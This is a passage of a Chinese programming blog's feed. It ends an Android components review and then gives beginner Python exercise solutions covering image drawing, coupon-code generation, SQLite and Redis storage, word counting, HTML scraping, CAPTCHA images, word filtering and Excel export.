<li>注册监听器，比如监听短信信息：<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Uri smsUri = Uri.parse(<span class="string">"content://sms"</span>);  </div><div class="line">getContentResolver().registerContentObserver(smsUri, <span class="keyword">true</span>, <span class="keyword">new</span> smsContentObserver());</div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习Android四大组件内容。&lt;/p&gt;
    
    </summary>
    
      <category term="Android基础" scheme="https://maoao530.github.io/categories/Android%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Android" scheme="https://maoao530.github.io/tags/Android/"/>
    
      <category term="Activity" scheme="https://maoao530.github.io/tags/Activity/"/>
    
      <category term="Service" scheme="https://maoao530.github.io/tags/Service/"/>
    
      <category term="BroadcastReceiver" scheme="https://maoao530.github.io/tags/BroadcastReceiver/"/>
    
      <category term="ContentProvider" scheme="https://maoao530.github.io/tags/ContentProvider/"/>
    
  </entry>
  
  <entry>
    <title>python每日编程训练</title>
    <link href="https://maoao530.github.io/2016/08/10/python-show-me-the-code/"/>
    <id>https://maoao530.github.io/2016/08/10/python-show-me-the-code/</id>
    <published>2016-08-10T05:47:00.000Z</published>
    <updated>2017-01-31T07:19:12.487Z</updated>
    
    <content type="html"><![CDATA[<p>python 编程练习</p>
<p>python 每日编程训练。（本文使用Python 3.5）</p>
<p>来源于 - <a href="https://github.com/Yixiaohan/show-me-the-code" target="_blank" rel="external">https://github.com/Yixiaohan/show-me-the-code</a></p>
<a id="more"></a>
<p>本文以问题加源码的形式发布。</p>
<h1 id="第-0000-题"><a href="#第-0000-题" class="headerlink" title="第 0000 题"></a>第 0000 题</h1><p>第 0000 题：将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果<br><img src="/img/archives/python-coding-0000.png" alt="0000-image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw, ImageFont</div><div class="line"></div><div class="line">image = Image.open(<span class="string">'0000.png'</span>, <span class="string">'r'</span>)</div><div class="line">font = ImageFont.truetype(<span class="string">'c:/Windows/Fonts/Arial.ttf'</span>, <span class="number">36</span>)</div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"></div><div class="line">w,h = image.size</div><div class="line"><span class="comment">#左上角</span></div><div class="line">draw.text(xy=(<span class="number">10</span>, <span class="number">10</span>), text=<span class="string">'9'</span>, fill=(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>), font=font)</div><div class="line">image.save(<span class="string">'0000-new.png'</span>, <span class="string">'png'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0001-题"><a href="#第-0001-题" class="headerlink" title="第 0001 题"></a>第 0001 题</h1><p>第 0001 题：做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），<br>使用 Python 如何生成 200 个激活码（或者优惠券）？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># the str length is 32 bytes</span></div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>)))</div></pre></td></tr></table></figure>
<h1 id="第-0002-题"><a href="#第-0002-题" class="headerlink" title="第 0002 题"></a>第 0002 题</h1><p>第 0002 题：将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"></div><div class="line"><span class="comment"># create database</span></div><div class="line">conn = sqlite3.connect(<span class="string">'0002.db'</span>)</div><div class="line">cursor = conn.cursor()</div><div class="line">sql = <span class="string">'create table if not exists save_code (id varchar(20) primary key, save_code varchar(50), is_use varchar(10))'</span></div><div class="line">cursor.execute(sql)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># generate str, length is 32 bytes</span></div><div class="line">    s = <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>))</div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , s)</div><div class="line">    <span class="comment"># insert into sqlite3</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        insert_sql = <span class="string">"insert into save_code (id, save_code, is_use) values ('%s', '%s', '%s')"</span> %(str(i), s, <span class="string">'no'</span>)</div><div class="line">        cursor.execute(insert_sql)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">'you had insert the save_code'</span>)</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="comment"># select and check</span></div><div class="line">select_sql = <span class="string">'select * from save_code'</span></div><div class="line">rs = cursor.execute(select_sql).fetchall()</div><div class="line"><span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">    print(r)</div><div class="line"></div><div class="line"><span class="comment"># close resource</span></div><div class="line">cursor.close()</div><div class="line">conn.commit()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h1 id="第-0003-题"><a href="#第-0003-题" class="headerlink" title="第 0003 题"></a>第 0003 题</h1><p>第 0003 题：将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 非关系型数据库中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> redis</div><div class="line"></div><div class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</div><div class="line">    <span class="comment"># generate str, length is 32 bytes</span></div><div class="line">    s = <span class="string">''</span>.join(str(uuid.uuid4()).split(<span class="string">'-'</span>))</div><div class="line">    print(i,  <span class="string">' ====&gt; '</span> , s)</div><div class="line">    r.lpush(<span class="string">'save_code'</span>,s)</div><div class="line"></div><div class="line">r.flushdb()</div></pre></td></tr></table></figure>
<h1 id="第-0004-题"><a href="#第-0004-题" class="headerlink" title="第 0004 题"></a>第 0004 题</h1><p>第 0004 题：任一个英文的纯文本文件，统计其中的单词出现的个数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'doc.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    data = f.read()</div><div class="line">    words = re.compile(<span class="string">r'([a-zA-Z]+)'</span>).findall(data)</div><div class="line"></div><div class="line">dicts = &#123;&#125;</div><div class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</div><div class="line">    <span class="keyword">if</span> dicts.get(word) == <span class="keyword">None</span>:</div><div class="line">        dicts[word] = <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        dicts[word] = dicts[word] + <span class="number">1</span></div><div class="line">    </div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dicts:</div><div class="line">    print(k, <span class="string">' ==&gt; '</span>, dicts[k])</div></pre></td></tr></table></figure>
<h1 id="第-0005-题"><a href="#第-0005-题" class="headerlink" title="第 0005 题"></a>第 0005 题</h1><p>第 0005 题：你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">images = [ x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>) <span class="keyword">if</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">'.png'</span> <span class="keyword">or</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">'.png'</span>]</div><div class="line"></div><div class="line">iphone5_w = <span class="number">64</span></div><div class="line">iphone5_h = <span class="number">113</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</div><div class="line">    print()</div><div class="line">    img = Image.open(image, <span class="string">'r'</span>)</div><div class="line">    w, h = img.size</div><div class="line">    scaleXY = max(w / iphone5_w, h / iphone5_h)</div><div class="line">    print(scaleXY)</div><div class="line">    <span class="keyword">if</span> scaleXY &gt; <span class="number">1.0</span> : </div><div class="line">        img.thumbnail((w/scaleXY, h/scaleXY))</div><div class="line">        img.save(os.path.splitext(image)[<span class="number">0</span>]+<span class="string">'_n'</span>+os.path.splitext(image)[<span class="number">1</span>], os.path.splitext(image)[<span class="number">1</span>][<span class="number">1</span>:])</div></pre></td></tr></table></figure>
<h1 id="第-0006-题"><a href="#第-0006-题" class="headerlink" title="第 0006 题"></a>第 0006 题</h1><p>第 0006 题：你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">DIR_NAME = <span class="string">'dir'</span></div><div class="line"></div><div class="line">docs = os.listdir(DIR_NAME)</div><div class="line"></div><div class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> docs:</div><div class="line">    <span class="keyword">with</span> open(os.path.join(DIR_NAME,doc), <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line">        words = re.compile(<span class="string">r'([a-zA-Z]+)'</span>).findall(data)</div><div class="line">    dicts = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:</div><div class="line">        <span class="keyword">if</span> dicts.get(word) == <span class="keyword">None</span>:</div><div class="line">            dicts[word] = <span class="number">1</span> </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            dicts[word] = dicts[word] + <span class="number">1</span></div><div class="line">    </div><div class="line">    maxValue = max(dicts.values())</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dicts:</div><div class="line">        <span class="keyword">if</span> dicts[k] == maxValue:</div><div class="line">            print(doc, <span class="string">' ==&gt; '</span>, k,dicts[k])</div></pre></td></tr></table></figure>
<h1 id="第-0007-题"><a href="#第-0007-题" class="headerlink" title="第 0007 题"></a>第 0007 题</h1><p>第 0007 题：有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">DIR_NAME = <span class="string">'dir'</span></div><div class="line">docs = os.listdir(DIR_NAME)</div><div class="line"></div><div class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> docs:</div><div class="line">    lines = <span class="number">0</span></div><div class="line">    comment_lines = <span class="number">0</span></div><div class="line">    blank_lines = <span class="number">0</span></div><div class="line">    <span class="keyword">with</span> open(os.path.join(DIR_NAME,doc), <span class="string">'r'</span>, encoding = <span class="string">'utf8'</span>, errors = <span class="string">'ignore'</span>) <span class="keyword">as</span> f:</div><div class="line">        multi_comment_line_start = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():    </div><div class="line">            lines += <span class="number">1</span></div><div class="line">            <span class="comment"># 忽略所有空格</span></div><div class="line">            line = line.split()          </div><div class="line">            <span class="keyword">if</span> len(line) == <span class="number">0</span>:</div><div class="line">                blank_lines += <span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">'#'</span>):</div><div class="line">                comment_lines += <span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">"'''"</span>) <span class="keyword">and</span> multi_comment_line_start == <span class="number">0</span>:</div><div class="line">                multi_comment_line_start = lines</div><div class="line">            <span class="keyword">elif</span> line[<span class="number">0</span>].startswith(<span class="string">"'''"</span>):</div><div class="line">                comment_lines = comment_lines + (lines - multi_comment_line_start + <span class="number">1</span>)</div><div class="line">                multi_comment_line_start = <span class="number">0</span> </div><div class="line">    print(<span class="string">'========================'</span>)       </div><div class="line">    print(doc,<span class="string">' : '</span>)</div><div class="line">    print(<span class="string">'lines'</span>,lines)</div><div class="line">    print(<span class="string">'comment_lines'</span>, comment_lines)</div><div class="line">    print(<span class="string">'blank_lines'</span>, blank_lines)</div></pre></td></tr></table></figure>
<h1 id="第-0008-题"><a href="#第-0008-题" class="headerlink" title="第 0008 题"></a>第 0008 题</h1><p>第 0008 题：一个HTML文件，找出里面的正文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://www.baidu.com'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line">print(soup.getText())</div></pre></td></tr></table></figure>
<h1 id="第-0009-题"><a href="#第-0009-题" class="headerlink" title="第 0009 题"></a>第 0009 题</h1><p>第 0009 题：一个HTML文件，找出里面的链接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://www.baidu.com'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line"><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</div><div class="line">    print(link.get(<span class="string">'href'</span>))</div></pre></td></tr></table></figure>
<h1 id="第-0010-题"><a href="#第-0010-题" class="headerlink" title="第 0010 题"></a>第 0010 题</h1><p>第 0010 题：使用 Python 生成类似于下图中的字母验证码图片</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageFilter</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="comment"># 随机字母:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndChar</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> chr(random.randint(<span class="number">65</span>, <span class="number">90</span>))</div><div class="line"></div><div class="line"><span class="comment"># 随机颜色1:用于填充背景</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndColor</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> (random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>))</div><div class="line"></div><div class="line"><span class="comment"># 随机颜色2:用于绘制字母</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndColor2</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> (random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>))</div><div class="line"></div><div class="line"><span class="comment"># 240 x 60:</span></div><div class="line">width = <span class="number">60</span> * <span class="number">4</span></div><div class="line">height = <span class="number">60</span></div><div class="line">image = Image.new(<span class="string">'RGB'</span>, (width, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</div><div class="line"><span class="comment"># 创建Font对象:</span></div><div class="line">font = ImageFont.truetype(<span class="string">'c:/Windows/Fonts/Arial.ttf'</span>, <span class="number">36</span>)</div><div class="line"><span class="comment"># 创建Draw对象:</span></div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"><span class="comment"># 填充每个像素:</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">        draw.point((x, y), fill=rndColor())</div><div class="line"><span class="comment"># 输出文字:</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">    draw.text((<span class="number">60</span> * t + <span class="number">10</span>, <span class="number">10</span>), rndChar(), font=font, fill=rndColor2())</div><div class="line"><span class="comment"># 模糊:</span></div><div class="line">image = image.filter(ImageFilter.BLUR)</div><div class="line">image.save(<span class="string">'code.jpg'</span>, <span class="string">'jpeg'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0011-题"><a href="#第-0011-题" class="headerlink" title="第 0011 题"></a>第 0011 题</h1><p>第 0011 题： 敏感词文本文件 filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">filename = <span class="string">'filtered_words.txt'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    words = f.read().split()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    s = input(<span class="string">'请输入单词&gt;&gt;&gt;'</span>)</div><div class="line">    </div><div class="line">    freedom = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:  </div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</div><div class="line">            print(<span class="string">'Freedom'</span>)</div><div class="line">            freedom = <span class="keyword">True</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> freedom:</div><div class="line">        print(<span class="string">'Human Rights'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0012-题"><a href="#第-0012-题" class="headerlink" title="第 0012 题"></a>第 0012 题</h1><p>第 0012 题： 敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 <em> 替换，例如当用户输入「北京是个好城市」，则变成「*</em>是个好城市」。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">filename = <span class="string">'filtered_words.txt'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    words = f.read().split()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    s = input(<span class="string">'请输入单词&gt;&gt;&gt;'</span>)</div><div class="line">    freedom = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:  </div><div class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</div><div class="line">            <span class="comment"># ** 替换原有字符串 </span></div><div class="line">            nPos = s.index(word)</div><div class="line">            nStr = <span class="string">''</span>.join([<span class="string">'*'</span> <span class="keyword">for</span> c <span class="keyword">in</span> word ])</div><div class="line">            s = s.replace(word, nStr)</div><div class="line">            freedom = <span class="keyword">True</span></div><div class="line">            print(s)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> freedom:</div><div class="line">        print(<span class="string">'Human Rights'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0013-题"><a href="#第-0013-题" class="headerlink" title="第 0013 题"></a>第 0013 题</h1><p>第 0013 题： 用 Python 写一个爬图片的程序，爬 这个链接里的日本妹子图片 :-)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup </div><div class="line"></div><div class="line">url = <span class="string">'http://tieba.baidu.com/p/2166231880'</span></div><div class="line">page = requests.get(url)</div><div class="line">soup = BeautifulSoup(page.text, <span class="string">'html.parser'</span>)</div><div class="line"></div><div class="line">n = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> soup.find_all(<span class="string">'img'</span>, attrs=&#123;<span class="string">'class'</span>:<span class="string">'BDE_Image'</span>&#125;):   </div><div class="line">    img_url = line.get(<span class="string">'src'</span>)</div><div class="line">    img_content = requests.get(img_url).content</div><div class="line">    filename = img_url[<span class="number">-10</span>:]</div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(img_content)</div><div class="line">    print(n, <span class="string">'image %s is download completed.'</span> % filename)</div><div class="line">    n += <span class="number">1</span></div></pre></td></tr></table></figure>
<h1 id="第-0014-题"><a href="#第-0014-题" class="headerlink" title="第 0014 题"></a>第 0014 题</h1><p>第 0014 题： 纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示：</p>
<p>{<br>    “1”:[“张三”,150,120,100],<br>    “2”:[“李四”,90,99,95],<br>    “3”:[“王五”,60,66,68]<br>}<br>请将上述内容写到 student.xls 文件中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'student.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    dicts = json.loads(f.read())</div><div class="line"></div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'student'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    col = <span class="number">0</span></div><div class="line">    table.write(row, col, k)</div><div class="line">    col += <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> dicts[k]:</div><div class="line">        table.write(row, col, v)</div><div class="line">        col += <span class="number">1</span></div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'student.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0015-题"><a href="#第-0015-题" class="headerlink" title="第 0015 题"></a>第 0015 题</h1><p>第 0015 题： 纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示：</p>
<p>{<br>    “1” : “上海”,<br>    “2” : “北京”,<br>    “3” : “成都”<br>}<br>请将上述内容写到 city.xls 文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'city.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    dicts = json.loads(f.read())</div><div class="line"></div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'city'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    col = <span class="number">0</span></div><div class="line">    table.write(row, col, k)</div><div class="line">    table.write(row, col + <span class="number">1</span>, dicts[k])</div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'city.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0016-题"><a href="#第-0016-题" class="headerlink" title="第 0016 题"></a>第 0016 题</h1><p>第 0016 题： 纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示：<br>[<br>    [1, 82, 65535],<br>    [20, 90, 13],<br>    [26, 809, 1024]<br>]<br>请将上述内容写到 numbers.xls 文件中</p>
